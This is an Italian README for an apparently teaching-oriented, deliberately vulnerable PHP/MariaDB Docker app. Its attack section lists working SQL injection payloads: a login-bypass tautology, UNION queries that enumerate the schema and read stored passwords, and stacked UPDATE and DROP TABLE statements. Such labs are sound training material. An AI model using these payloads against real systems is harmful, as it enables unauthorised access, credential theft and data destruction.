# SQL Injection Demo App (PHP + MariaDB + Docker)

Questa applicazione è stata creata per scopi didattici e dimostra le vulnerabilità SQL Injection più comuni in un contesto web.

---

## Funzionalità

- Login vulnerabile (tautologia)
- Dashboard con elenco parziale degli utenti
- Form di ricerca email vulnerabile a:
  - UNION SELECT
  - Esfiltrazione dati da `information_schema`
  - Piggybacking (`DROP`, `UPDATE`)
- Style CSS semplice incluso

---

## Tecnologie

- PHP (senza framework)
- MariaDB 10.5
- Docker & Docker Compose

---

## Avvio dell'applicazione

1. Clona il progetto

```bash
git clone https://github.com/tuo-utente/sql-injection-demo.git
cd sql-injection-demo
```

2. Avvia i container

```bash
docker-compose up --build
```

L'app sarà disponibile su `http://localhost:8080/login.html`

---

## Login di esempio

Tautologia:
```
Username: ' OR 1=1 #
Password: qualsiasi
```

Credenziali reali:
```
Username: admin
Password: admin123
```

---

## Esecuzione di attacchi SQLi

Tautologia:
```
' OR 1=1 #
```

Scoprire nome database:
```
' UNION SELECT 1, DATABASE(), 'x' #
```

Elencare tutti gli schemi:
```
' UNION SELECT 1, schema_name, 'x' FROM information_schema.schemata #
```

Elencare tabelle:
```
' UNION SELECT 1, table_name, 'x' FROM information_schema.tables WHERE table_schema='sqli_demo' #
```

Elencare colonne:
```
' UNION SELECT 1, column_name, 'x' FROM information_schema.columns WHERE table_name='utenti' AND table_schema='sqli_demo' #
```

Leggere credenziali:
```
' UNION SELECT id, username, password FROM utenti #
```

Aggiornare un utente:
```
' ; UPDATE utenti SET ruolo = 'admin' WHERE username = 'user1'; --
```

Cancellare la tabella:
```
' ; DROP TABLE utenti; --
```

---

## Ripristino del database

Se la tabella o il database vengono eliminati durante i test, puoi ricostruire tutto con:

```bash
docker-compose down -v
docker-compose up --build
```

---

## Crediti

Progetto sviluppato per scopi didattici. **Non usare in ambienti di produzione.**